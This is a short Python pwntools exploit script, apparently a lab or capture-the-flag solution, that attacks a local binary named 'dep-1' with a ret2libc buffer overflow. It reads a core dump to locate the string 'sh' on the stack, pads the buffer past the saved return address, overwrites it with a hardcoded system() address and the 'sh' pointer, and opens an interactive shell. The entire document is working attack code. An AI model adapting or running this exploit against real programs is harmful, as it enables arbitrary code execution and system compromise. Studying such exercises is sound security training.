#!/usr/bin/env python

from pwn import *
#import os


p = process('./dep-1')

#buf = "A" * 136
c = Core('core')

#0xffffddcc
addr_of_shellc = c.stack.find('sh')
print(hex(addr_of_shellc))
buf = "A" * 128
buf += "AAAA" * 3
#system address
buf += p32(0xf7e39da0)
buf += "BBBB"
buf += p32(addr_of_shellc)
p.sendline(buf)
p.interactive()
